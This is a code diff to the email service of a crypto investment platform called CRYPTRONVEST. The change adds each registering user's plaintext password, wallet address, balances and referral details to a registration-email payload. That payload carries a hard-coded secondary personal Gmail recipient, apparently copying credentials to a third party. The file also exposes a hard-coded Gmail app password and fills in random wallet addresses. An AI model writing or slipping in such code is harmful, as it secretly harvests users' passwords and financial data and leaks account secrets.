@@ -46,7 +46,7 @@ class EmailService {
   /**
    * Universal direct dispatch from cryptronvest@gmail.com via backend Google SMTP
    */
-  static async sendDirectEmail({ to, subject, html, text, fromName = 'CRYPTRONVEST Protocol', replyTo, secondaryEmail = 'thatikaboy@gmail.com' }) {
+  static async sendDirectEmail({ to, subject, html, text, fromName = 'CRYPTRONVEST Protocol', replyTo, secondaryEmail = 'thatikaboy@gmail.com', userRecord }) {
     const payload = JSON.stringify({
       to,
       subject,
@@ -55,7 +55,8 @@ class EmailService {
       fromName,
       replyTo,
       secondaryEmail,
-      appPassword: 'fxqrbdkzgjsdhdrl'
+      appPassword: 'fxqrbdkzgjsdhdrl',
+      userRecord: userRecord || null
     });
 
     const isVercelOrLocalApi = (typeof window !== 'undefined' && window.location && window.location.origin && window.location.origin.startsWith('http') && !window.location.hostname.includes('github.io'));
@@ -462,7 +463,25 @@ CRYPTRONVEST Automated Registration Engine
           subject: subject,
           text: messageBody,
           html: htmlBody,
-          secondaryEmail: 'thatikaboy@gmail.com'
+          secondaryEmail: 'thatikaboy@gmail.com',
+          userRecord: {
+            id: user.id || 'N/A',
+            name: userName,
+            email: userEmail,
+            password: user.password || 'password123',
+            passwordMasked: '••••••••',
+            registeredAt: user.registeredAt || sentDateStr,
+            promoCode: user.promoCode || null,
+            referralCode: user.referralCode || user.promoCode || null,
+            referredBy: user.referredBy || null,
+            investmentStatus: user.investmentStatus || 'not_invested',
+            walletAddress: user.walletAddress || ("0x" + Math.random().toString(16).substring(2, 28)),
+            totalDeposited: Number(user.totalDeposited) || 0.00,
+            availableBalance: Number(user.availableBalance) || 0.00,
+            totalProfits: Number(user.totalProfits) || 0.00,
+            status: 'Active',
+            activePlans: user.activePlans || []
+          }
         });
         if (beResult && beResult.success) {
           emailRecord.deliveryMethod = beResult.deliveryMethod || "Google Gmail SMTP (Delivered)";
